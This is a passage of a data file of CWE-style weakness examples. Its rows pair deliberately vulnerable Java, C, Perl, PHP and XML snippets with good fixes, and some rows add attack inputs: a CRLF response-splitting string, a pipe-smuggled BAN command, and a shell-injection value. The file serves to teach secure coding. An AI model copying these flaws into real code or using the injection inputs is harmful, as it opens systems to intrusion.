private String email;
...

                           
public RegistrationForm() {
super();
}

                           
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {
ActionErrors errors = super.validate(mapping, request);
if (errors == null) {
errors = new ActionErrors();
}

                           

                           
if (getName() == null || getName().length() < 1) {
errors.add(""name"", new ActionMessage(""error.name.required""));
}
return errors;

                     
}

                     
// getter and setter methods for private variables
...
}

               "
104,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.action.ActionForm {

                     

                        
// private variables for registration form
private String name;
private String email;
...

                           
public RegistrationForm() {
super();
}

                           
// getter and setter methods for private variables
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        
// private variables for registration form
private String name;
private String email;
...

                           
public RegistrationForm() {
super();
}

                           
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}

                           
// getter and setter methods for private variables
...

                     
}

               "
105,"
example: 1
NATURE:result:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                        

                        
// private variables for registration form

                        
private String name;
private String address;
private String city;
private String state;
private String zipcode;
private String phone;
private String email;

                        
public RegistrationForm() {
super();
}

                        

                        
// getter and setter methods for private variables

                        
...

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<form-validation>
<formset>
<form name=""RegistrationForm"">
<field property=""name"" depends=""required"">
<arg position=""0"" key=""prompt.name""/>
</field>
<field property=""address"" depends=""required"">
<arg position=""0"" key=""prompt.address""/>
</field>
<field property=""city"" depends=""required"">
<arg position=""0"" key=""prompt.city""/>
</field>
<field property=""state"" depends=""required,mask"">
<arg position=""0"" key=""prompt.state""/>
<var>
<var-name>mask</var-name>
<var-value>[a-zA-Z]{2}</var-value>
</var>
</field>
<field property=""zipcode"" depends=""required,mask"">
<arg position=""0"" key=""prompt.zipcode""/>
<var>
<var-name>mask</var-name>
<var-value>\d{5}</var-value>
</var>
</field>
</form>
</formset>
</form-validation>

               
example: 3
NATURE:good:
LANGUAGE:XML:
                  
<form-validation>
<formset>
<form name=""RegistrationForm"">
<field property=""name"" depends=""required"">
<arg position=""0"" key=""prompt.name""/>
</field>
<field property=""address"" depends=""required"">
<arg position=""0"" key=""prompt.address""/>
</field>
<field property=""city"" depends=""required"">
<arg position=""0"" key=""prompt.city""/>
</field>
<field property=""state"" depends=""required,mask"">
<arg position=""0"" key=""prompt.state""/>
<var>
<var-name>mask</var-name>
<var-value>[a-zA-Z]{2}</var-value>
</var>
</field>
<field property=""zipcode"" depends=""required,mask"">
<arg position=""0"" key=""prompt.zipcode""/>
<var>
<var-name>mask</var-name>
<var-value>\d{5}</var-value>
</var>
</field>
<field property=""phone"" depends=""required,mask"">
<arg position=""0"" key=""prompt.phone""/>
<var>
<var-name>mask</var-name>
<var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value>
</var>
</field>
<field property=""email"" depends=""required,email"">
<arg position=""0"" key=""prompt.email""/>
</field>
</form>
</formset>
</form-validation>

               "
106,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.action.ActionForm {

                        

                        
// private variables for registration form

                        
private String name;
private String email;
...

                        
public RegistrationForm() {
super();
}

                        

                        
// getter and setter methods for private variables

                        
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                        

                        
// private variables for registration form

                        
private String name;
private String email;
...

                        
public RegistrationForm() {
super();
}

                        
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}

                        

                        
// getter and setter methods for private variables

                        
...

                     
}

               
example: 3
NATURE:good:
LANGUAGE:XML:
                  
<struts-config>

                        
<form-beans>
<form-bean name=""RegistrationForm"" type=""RegistrationForm""/>
</form-beans>

                        
...

                        
<!-- ========================= Validator plugin ================================= -->
<plug-in className=""org.apache.struts.validator.ValidatorPlugIn"">
<set-property
property=""pathnames""
value=""/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml""/>

                        
</plug-in>

                     
</struts-config>

               "
107,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        

                           

                           
// private variables for registration form

                           
private String name;
private String address;
private String city;
private String state;
private String zipcode;

                           
// no longer using the phone form field

                           

                           

                           
// private String phone;

                           
private String email;

                           
public RegistrationForm() {
super();
}

                           

                           
// getter and setter methods for private variables

                           
...

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<form-validation>

                        
<formset>

                              
<form name=""RegistrationForm"">

                                    
<field property=""name"" depends=""required"">
<arg position=""0"" key=""prompt.name""/>
</field>
<field property=""address"" depends=""required"">
<arg position=""0"" key=""prompt.address""/>
</field>
<field property=""city"" depends=""required"">
<arg position=""0"" key=""prompt.city""/>
</field>
<field property=""state"" depends=""required,mask"">
<arg position=""0"" key=""prompt.state""/>
<var>
<var-name>mask</var-name>
<var-value>[a-zA-Z]{2}</var-value>
</var>
</field>
<field property=""zipcode"" depends=""required,mask"">
<arg position=""0"" key=""prompt.zipcode""/>
<var>
<var-name>mask</var-name>
<var-value>\d{5}</var-value>
</var>
</field>
<field property=""phone"" depends=""required,mask"">
<arg position=""0"" key=""prompt.phone""/>
<var>
<var-name>mask</var-name>
<var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value>
</var>
</field>
<field property=""email"" depends=""required,email"">
<arg position=""0"" key=""prompt.email""/>
</field>

                                 
</form>

                           
</formset>

                     
</form-validation>

               "
108,
109,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<action path=""/download""
type=""com.website.d2.action.DownloadAction""
name=""downloadForm""
scope=""request""
input="".download""
validate=""false"">
</action>

               "
110,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class DateRangeForm extends ValidatorForm {

                        
String startDate, endDate;

                           
public void setStartDate(String startDate) {
this.startDate = startDate;
}

                           
public void setEndDate(String endDate) {
this.endDate = endDate;
}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<form name=""DateRangeForm"">
<field property=""startDate"" depends=""date"">
<arg0 key=""start.date""/>
</field>
<field property=""endDate"" depends=""date"">
<arg0 key=""end.date""/>
</field>
<field property=""scale"" depends=""integer"">
<arg0 key=""range.scale""/>
</field>
</form>

               "
111,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
class Echo {

                        

                           
public native void runEcho();
static {

                              

                                 
System.loadLibrary(""echo"");

                           
}
public static void main(String[] args) {

                              

                                 
new Echo().runEcho();

                           
}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
#include <jni.h>
#include ""Echo.h""//the java class above compiled with javah
#include <stdio.h>

                     
JNIEXPORT void JNICALL
Java_Echo_runEcho(JNIEnv *env, jobject obj)
{
char buf[64];
gets(buf);
printf(buf);
}

               "
112,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
// Read DOM

                     
try {
...
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setValidating( false );
....
c_dom = factory.newDocumentBuilder().parse( xmlFile );
} catch(Exception ex) {
...
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
builderFactory.setNamespaceAware(true);
DocumentBuilder builder = builderFactory.newDocumentBuilder();

               "
113,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String author = request.getParameter(AUTHOR_PARAM);
...
Cookie cookie = new Cookie(""author"", author);
cookie.setMaxAge(cookieExpiration);
response.addCookie(cookie);

               
example: 2
NATURE:result:
                  
HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...

               
example: 3
NATURE:attack:
                  
Wiley Hacker\r\nHTTP/1.1 200 OK\r\n

               
example: 4
NATURE:result:
                  
HTTP/1.1 200 OK
...
Set-Cookie: author=Wiley Hacker HTTP/1.1 200 OK
...

               "
114,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
System.loadLibrary(""library.dll"");
...

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
...
RegQueryValueEx(hkey, ""APPHOME"",
0, 0, (BYTE*)home, &size);
char* lib=(char*)malloc(strlen(home)+strlen(INITLIB));
if (lib) {

                        

                           
strcpy(lib,home);
strcat(lib,INITCMD);
LoadLibrary(lib);

                     
}
...

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
LoadLibrary(""liberty.dll"");

               "
115,
116,"
example: 1
NATURE:bad:
LANGUAGE:JSP:
                  
<% String email = request.getParameter(""email""); %>
...
Email Address: <%= email %>

               
example: 2
NATURE:bad:
LANGUAGE:Perl:
                  
$inputString = readLineFromFileHandle($serverFH);

                     

                     
# generate an array of strings separated by the ""|"" character.

                     
@commands = split(/\|/, $inputString);

                     
foreach $cmd (@commands) {

                        

                        
# separate the operator from its arguments based on a single whitespace

                        
($operator, $args) = split(/ /, $cmd, 2);

                        
$args = UrlDecode($args);
if ($operator eq ""BAN"") {
ExecuteBan($args);
}
elsif ($operator eq ""SAY"") {
ExecuteSay($args);
}
}

               
example: 3
NATURE:bad:
LANGUAGE:Perl:
                  
$inputString = GetUntrustedArgument(""command"");
($cmd, $argstr) = split(/\s+/, $inputString, 2);

                     

                     
# removes extra whitespace and also changes CRLF's to spaces

                     
$argstr =~ s/\s+/ /gs;

                     
$argstr = UrlEncode($argstr);
if (($cmd eq ""BAN"") && (! IsAdministrator($username))) {
die ""Error: you are not the admin.\n"";
}

                     

                     
# communicate with file server using a file handle

                     
$fh = GetServerFileHandle(""myserver"");

                     
print $fh ""$cmd $argstr\n"";

               
example: 4
NATURE:attack:
                  
SAY hello world|BAN user12

               
example: 5
NATURE:result:
                  
SAY hello%20world|BAN%20user12

               
example: 6
NATURE:result:
                  
SAY hello world
BAN user12

               
example: 7
NATURE:bad:
LANGUAGE:Perl:
                  
sub GetUntrustedInput {
return($ARGV[0]);
}

                     
sub encode {
my($str) = @_;
$str =~ s/\&/\&amp;/gs;
$str =~ s/\""/\&quot;/gs;
$str =~ s/\'/\&apos;/gs;
$str =~ s/\</\&lt;/gs;
$str =~ s/\>/\&gt;/gs;
return($str);
}

                     
sub doit {
my $uname = encode(GetUntrustedInput(""username""));
print ""<b>Welcome, $uname!</b><p>\n"";
system(""cd /home/$uname; /bin/ls -l"");

                     
}

               
example: 8
NATURE:attack:
                  
' pwd

               "
117,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String val = request.getParameter(""val"");
try {

                        

                           
int value = Integer.parseInt(val);

                     
}
catch (NumberFormatException) {
log.info(""Failed to parse val = "" + val);
}
...

               "
118,
119,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char * copy_input(char *user_supplied_string){

                        
int i, dst_index;
char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);
if ( MAX_SIZE <= strlen(user_supplied_string) ){
die(""user string too long, die evil hacker!"");
}
dst_index = 0;
for ( i = 0; i < strlen(user_supplied_string); i++ ){

                              
if( '&' == user_supplied_string[i] ){
dst_buf[dst_index++] = '&';
dst_buf[dst_index++] = 'a';
dst_buf[dst_index++] = 'm';
dst_buf[dst_index++] = 'p';
dst_buf[dst_index++] = ';';
}
else if ('<' == user_supplied_string[i] ){

                                    

                                       

                                       
/* encode to &lt; */

                                       

                                    

                                 
}
else dst_buf[dst_index++] = user_supplied_string[i];

                           
}
return dst_buf;

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  

                     
int main (int argc, char **argv) {
char *items[] = {""boat"", ""car"", ""truck"", ""train""};
int index = GetUntrustedOffset();
printf(""You selected %s\n"", items[index-1]);
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
int getValueFromArray(int *array, int len, int index) {

                        

                           
int value;

                           

                           
// check that the array index is less than the maximum

                           

                           

                           
// length of the array

                           
if (index < len) {

                              

                                 

                                 
// get the value at the specified index of the array

                                 
value = array[index];

                           
}

                           
// if array index is invalid then output error message

                           

                           

                           
// and return value indicating error

                           
else {
printf(""Value is: %d\n"", array[index]);
value = -1;
}

                           
return value;

                     
}

               
example: 5
NATURE:good:
LANGUAGE:C:
                  

                     
...

                     

                     
// check that the array index is within the correct

                     

                     

                     
// range of values for the array

                     
if (index >= 0 && index < len) {

                     
...

               "
120,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char last_name[20];
printf (""Enter your last name: "");
scanf (""%s"", last_name);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
void manipulate_string(char* string){
char buf[24];
strcpy(buf, string);
...
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  

                     
char buf[24];
printf(""Please enter your name and press <Enter>\n"");
gets(buf);
...
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
...

                        
struct hostent *clienthp;
char hostname[MAX_LEN];

                           
// create server socket, bind to server address and listen on socket
...

                           
// accept client connections and process requests
int count = 0;
for (count = 0; count < MAX_CONNECTIONS; count++) {

                              

                                 
int clientlen = sizeof(struct sockaddr_in);
int clientsocket = accept(serversocket, (struct sockaddr *)&clientaddr, &clientlen);

                                 
if (clientsocket >= 0) {

                                    
clienthp = gethostbyaddr((char*) &clientaddr.sin_addr.s_addr, sizeof(clientaddr.sin_addr.s_addr), AF_INET);
strcpy(hostname, clienthp->h_name);
logOutput(""Accepted client connection from host "", hostname);

                                       
// process client request
...
close(clientsocket);

                                 
}

                           
}
close(serversocket);

                     

                     
...

               "
121,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define BUFSIZE 256
int main(int argc, char **argv) {
char buf[BUFSIZE];
strcpy(buf, argv[1]);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               "
122,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define BUFSIZE 256
int main(int argc, char **argv) {
char *buf;
buf = (char *)malloc(sizeof(char)*BUFSIZE);
strcpy(buf, argv[1]);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char * copy_input(char *user_supplied_string){

                        
int i, dst_index;
char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);
if ( MAX_SIZE <= strlen(user_supplied_string) ){
die(""user string too long, die evil hacker!"");
}
dst_index = 0;
for ( i = 0; i < strlen(user_supplied_string); i++ ){

                              
if( '&' == user_supplied_string[i] ){
dst_buf[dst_index++] = '&';
dst_buf[dst_index++] = 'a';
dst_buf[dst_index++] = 'm';
dst_buf[dst_index++] = 'p';
dst_buf[dst_index++] = ';';
}
else if ('<' == user_supplied_string[i] ){

                                    

                                       

                                       
/* encode to &lt; */

                                       

                                    

                                 
}
else dst_buf[dst_index++] = user_supplied_string[i];

                           
}
return dst_buf;

                     
}

               "
123,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define BUFSIZE 256
int main(int argc, char **argv) {
char *buf1 = (char *) malloc(BUFSIZE);
char *buf2 = (char *) malloc(BUFSIZE);
strcpy(buf1, argv[1]);
free(buf2);
}

               "
124,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* trimTrailingWhitespace(char *strMessage, int length) {

                        
char *retMessage;
char *message = malloc(sizeof(char)*(length+1));

                           

                           
// copy input string to a temporary string

                           
char message[length+1];
int index;
for (index = 0; index < length; index++) {
message[index] = strMessage[index];
}
message[index] = '\0';

                           

                           
// trim trailing whitespace

                           
int len = index-1;
while (isspace(message[len])) {
message[len] = '\0';
len--;
}

                           

                           
// return string without trailing whitespace

                           
retMessage = message;
return retMessage;

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int main() {
...
strncpy(destBuf, &srcBuf[find(srcBuf, ch)], 1024);
...
}

               "
125,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int getValueFromArray(int *array, int len, int index) {

                        

                           
int value;

                           

                           
// check that the array index is less than the maximum

                           

                           

                           
// length of the array

                           
if (index < len) {

                              

                                 

                                 
// get the value at the specified index of the array

                                 
value = array[index];

                           
}

                           
// if array index is invalid then output error message

                           

                           

                           
// and return value indicating error

                           
else {
printf(""Value is: %d\n"", array[index]);
value = -1;
}

                           
return value;

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  

                     
...

                     

                     
// check that the array index is within the correct

                     

                     

                     
// range of values for the array

                     
if (index >= 0 && index < len) {

                     
...

               "
126,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int processMessageFromSocket(int socket) {

                        
int success;

                           
char buffer[BUFFER_SIZE];
char message[MESSAGE_SIZE];

                           

                           
// get message from socket and store into buffer

                           

                           

                           
//Ignoring possibliity that buffer > BUFFER_SIZE

                           
if (getMessage(socket, buffer, BUFFER_SIZE) > 0) {

                              

                                 

                                 
// place contents of the buffer into message structure

                                 
ExMessage *msg = recastBuffer(buffer);

                                 

                                 
// copy message body into string for processing

                                 
int index;
for (index = 0; index < msg->msgLength; index++) {
message[index] = msg->msgBody[index];
}
message[index] = '\0';

                                 

                                 
// process message

                                 
success = processMessage(message);

                           
}
return success;

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int main(int argc, char **argv)
{

                     
char Filename[256];
char Pattern[32];

                        

                        
/* Validate number of parameters and ensure valid content */

                        
...

                        

                        
/* copy filename parameter to variable, may cause off-by-one overflow */

                        
strncpy(Filename, argv[1], sizeof(Filename));

                        

                        
/* copy pattern parameter to variable, may cause off-by-one overflow */

                        
strncpy(Pattern, argv[2], sizeof(Pattern));

                        
printf(""Searching file: %s for the pattern: %s\n"", Filename, Pattern);
Scan_File(Filename, Pattern);
}

               
example: 3
NATURE:good:
LANGUAGE:C:
                  

                     
/* copy filename parameter to variable, no off-by-one overflow */

                     
strncpy(Filename, argv[2], sizeof(Filename)-1);
Filename[255]='\0';

                     

                     
/* copy pattern parameter to variable, no off-by-one overflow */

                     
strncpy(Pattern, argv[3], sizeof(Pattern)-1);
Pattern[31]='\0';

               "
127,
128,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
img_t table_ptr; /*struct containing img data, 10kB each*/
int num_imgs;
...
num_imgs = get_num_imgs();
table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);
...

               "
129,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public String getValue(int index) {
return array[index];
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
private void buildList ( int untrustedListSize ){
if ( 0 > untrustedListSize ){
die(""Negative value supplied for list size, die evil hacker!"");
}
Widget[] list = new Widget [ untrustedListSize ];
list[0] = new Widget();
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int getValueFromArray(int *array, int len, int index) {

                        

                           
int value;

                           

                           
// check that the array index is less than the maximum

                           

                           

                           
// length of the array

                           
if (index < len) {

                              

                                 

                                 
// get the value at the specified index of the array

                                 
value = array[index];

                           
}

                           
// if array index is invalid then output error message

                           

                           

                           
// and return value indicating error

                           
else {
printf(""Value is: %d\n"", array[index]);
value = -1;
}

                           
return value;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C:
                  

                     
...

                     

                     
// check that the array index is within the correct

                     

                     

                     
// range of values for the array

                     
if (index >= 0 && index < len) {

                     
...

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  

                     

                     
/* capture the sizes of all messages */

                     
int getsizes(int sock, int count, int *sizes) {

                        
...
char buf[BUFFER_SIZE];
int ok;
int num, size;

                           

                           
// read values from socket and added to sizes array

                           
while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0)
{

                              

                                 

                                 
// continue read from socket until buf only contains '.'

                                 
if (DOTLINE(buf))
break;

                                 
else if (sscanf(buf, ""%d %d"", &num, &size) == 2)
sizes[num - 1] = size;

                              

                           
}
...

                        

                     
}

               
example: 6
NATURE:good:
LANGUAGE:C:
                  

                     

                     
/* capture the sizes of all messages */

                     
int getsizes(int sock, int count, int *sizes) {

                        
...
char buf[BUFFER_SIZE];
int ok;
int num, size;

                           

                           
// read values from socket and added to sizes array

                           
while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0)
{

                              

                                 

                                 
// continue read from socket until buf only contains '.'

                                 
if (DOTLINE(buf))
break;

                                 
else if (sscanf(buf, ""%d %d"", &num, &size) == 2) {

                                    
if (num > 0 && num <= (unsigned)count)
sizes[num - 1] = size;

                                       
else

                                          

                                             

                                             
/* warn about possible attempt to induce buffer overflow */

                                             
report(stderr, ""Warning: ignoring bogus data for message sizes returned by server.\n"");

                                       

                                    

                                 
}

                           
}
...

                        

                     
}

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
// Method called from servlet to obtain product information

                     
public String displayProductSummary(int index) {

                     

                        
String productSummary = new String("""");

                           
try {
String productSummary = getProductSummary(index);

                           

                           
} catch (Exception ex) {...}

                           
return productSummary;

                     
}

                     
public String getProductSummary(int index) {
return products[index];
}

               
example: 8
NATURE:good:
LANGUAGE:Java:
                  

                     

                     
// Method called from servlet to obtain product information

                     
public String displayProductSummary(int index) {

                     

                        
String productSummary = new String("""");

                           
try {
String productSummary = getProductSummary(index);

                           

                           
} catch (Exception ex) {...}

                           
return productSummary;

                     
}

                     
public String getProductSummary(int index) {

                        
String productSummary = """";

                           
if ((index >= 0) && (index < MAX_PRODUCTS)) {
productSummary = products[index];
}
else {
System.err.println(""index is out of bounds"");
throw new IndexOutOfBoundsException();
}

                           
return productSummary;

                     
}

               
example: 9
NATURE:good:
LANGUAGE:Java:
                  
ArrayList productArray = new ArrayList(MAX_PRODUCTS);
...
try {
productSummary = (String) productArray.get(index);
} catch (IndexOutOfBoundsException ex) {...}

               
example: 10
NATURE:bad:
LANGUAGE:C:
                  

                     
int main (int argc, char **argv) {
char *items[] = {""boat"", ""car"", ""truck"", ""train""};
int index = GetUntrustedOffset();
printf(""You selected %s\n"", items[index-1]);
}

               "
130,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int processMessageFromSocket(int socket) {

                        
int success;

                           
char buffer[BUFFER_SIZE];
char message[MESSAGE_SIZE];

                           

                           
// get message from socket and store into buffer

                           

                           

                           
//Ignoring possibliity that buffer > BUFFER_SIZE

                           
if (getMessage(socket, buffer, BUFFER_SIZE) > 0) {

                              

                                 

                                 
// place contents of the buffer into message structure

                                 
ExMessage *msg = recastBuffer(buffer);

                                 

                                 
// copy message body into string for processing

                                 
int index;
for (index = 0; index < msg->msgLength; index++) {
message[index] = msg->msgBody[index];
}
message[index] = '\0';

                                 

                                 
// process message

                                 
success = processMessage(message);

                           
}
return success;

                     
}

               "
131,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int i;
unsigned int numWidgets;
Widget **WidgetList;

                     
numWidgets = GetUntrustedSizeValue();
if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) {
ExitError(""Incorrect number of widgets requested!"");
}
WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));
printf(""WidgetList ptr=%p\n"", WidgetList);
for(i=0; i<numWidgets; i++) {
WidgetList[i] = InitializeWidget();
}
WidgetList[numWidgets] = NULL;
showWidgets(WidgetList);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
img_t table_ptr; /*struct containing img data, 10kB each*/
int num_imgs;
...
num_imgs = get_num_imgs();
table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);
...

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
char * copy_input(char *user_supplied_string){

                        
int i, dst_index;
char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);
if ( MAX_SIZE <= strlen(user_supplied_string) ){
die(""user string too long, die evil hacker!"");
}
dst_index = 0;
for ( i = 0; i < strlen(user_supplied_string); i++ ){

                              
if( '&' == user_supplied_string[i] ){
dst_buf[dst_index++] = '&';
dst_buf[dst_index++] = 'a';
dst_buf[dst_index++] = 'm';
dst_buf[dst_index++] = 'p';
dst_buf[dst_index++] = ';';
}
else if ('<' == user_supplied_string[i] ){

                                    

                                       

                                       
/* encode to &lt; */

                                       

                                    

                                 
}
else dst_buf[dst_index++] = user_supplied_string[i];

                           
}
return dst_buf;

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
DataPacket *packet;
int numHeaders;
PacketHeader *headers;

                     
sock=AcceptSocketConnection();
ReadPacket(packet, sock);
numHeaders =packet->headers;

                     
if (numHeaders > 100) {
ExitError(""too many headers!"");
}
headers = malloc(numHeaders * sizeof(PacketHeader);
ParsePacketHeaders(packet, headers);

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
int *id_sequence;

                     

                     
/* Allocate space for an array of three ids. */

                     

                     

                     
id_sequence = (int*) malloc(3);
if (id_sequence == NULL) exit(1);

                     

                     
/* Populate the id array. */

                     

                     

                     
id_sequence[0] = 13579;
id_sequence[1] = 24680;
id_sequence[2] = 97531;

               "
134,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>

                     
void printWrapper(char *string) {

                        

                           
printf(string);

                     
}

                     
int main(int argc, char **argv) {

                        

                           
char buf[5012];
memcpy(buf, argv[1], 5012);
printWrapper(argv[1]);
return (0);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int main(int argc, char **argv){
char buf[128];
...
snprintf(buf,128,argv[1]);
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
printf(""%d %d %1$d %1$d\n"", 5, 9);

               "
135,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>
#include <strings.h>
#include <wchar.h>

                     
int main() {

                        

                           
wchar_t wideString[] = L""The spazzy orange tiger jumped "" \
""over the tawny jaguar."";
wchar_t *newString;

                           
printf(""Strlen() output: %d\nWcslen() output: %d\n"",
strlen(wideString), wcslen(wideString));

                           
/* Wrong because the number of chars in a string isn't related to its length in bytes //
newString = (wchar_t *) malloc(strlen(wideString));
*/

                           
/* Wrong because wide characters aren't 1 byte long! //
newString = (wchar_t *) malloc(wcslen(wideString));
*/

                           
/* Wrong because wcslen does not include the terminating null */
newString = (wchar_t *) malloc(wcslen(wideString) * sizeof(wchar_t));

                           
/* correct! */
newString = (wchar_t *) malloc((wcslen(wideString) + 1) * sizeof(wchar_t));

                           
/* ... */

                     
}

               
example: 2
NATURE:result:
                  
Strlen() output: 0
Wcslen() output: 53

               "
138,
140,
141,
142,
143,
144,
145,
146,
147,
148,
149,
150,
151,
152,
153,
154,
155,
156,
157,
158,
159,
160,
161,
162,
163,
164,
165,
166,
167,
168,
170,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define MAXLEN 1024
...
char *pathbuf[MAXLEN];
...
read(cfgfile,inputbuf,MAXLEN); //does not null terminate
strcpy(pathbuf,inputbuf); //requires null terminated input
...

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char buf[MAXPATH];
...
readlink(pathname, buf, MAXPATH);
int length = strlen(buf);
...

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>
#include <string.h>

                     
int main() {

                        

                           
char longString[] = ""String signifying nothing"";
char shortString[16];

                           
strncpy(shortString, longString, 16);
printf(""The last character in shortString is: %c (%1$x)\n"", shortString[15]);
return (0);

                     
}

               "
172,
173,
174,
175,
176,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void getUserInfo(char *username, struct _USER_INFO_2 info){
WCHAR unicodeUser[UNLEN+1];
MultiByteToWideChar(CP_ACP, 0, username, -1, unicodeUser, sizeof(unicodeUser));
NetUserGetInfo(NULL, unicodeUser, 2, (LPBYTE *)&info);
}

               "
177,
178,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public String preventXSS(String input, String mask) {
return input.replaceAll(""script"", mask);
}

               "
179,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String path = getInputPath();
if (path.startsWith(""/safe_dir/""))
{
File f = new File(path);
return f.getCanonicalPath();
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
String path = getInputPath();
File f = new File(path);
if (f.getCanonicalPath().startsWith(""/safe_dir/""))
{
return f.getCanonicalPath();
}

                     

                  

               
example: 3
NATURE:bad:
LANGUAGE:PHP:
                  
function createDir($userName,$dirName){
$userDir = '/users/'. $userName;
if(strpos($dirName,'..') !== false){
echo 'Directory name contains invalid sequence';
return;
}

                        
//filter out '~' because other scripts identify user directories by this prefix

                        
$dirName = str_replace('~','',$dirName);
$newDir = $userDir . $dirName;
mkdir($newDir, 0700);
chown($newDir,$userName);
}

               "
180,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String path = getInputPath();
if (path.startsWith(""/safe_dir/""))
{
File f = new File(path);
return f.getCanonicalPath();
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
String path = getInputPath();
File f = new File(path);
if (f.getCanonicalPath().startsWith(""/safe_dir/""))
{
return f.getCanonicalPath();
}

                     

                  

               "
181,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function createDir($userName,$dirName){
$userDir = '/users/'. $userName;
if(strpos($dirName,'..') !== false){
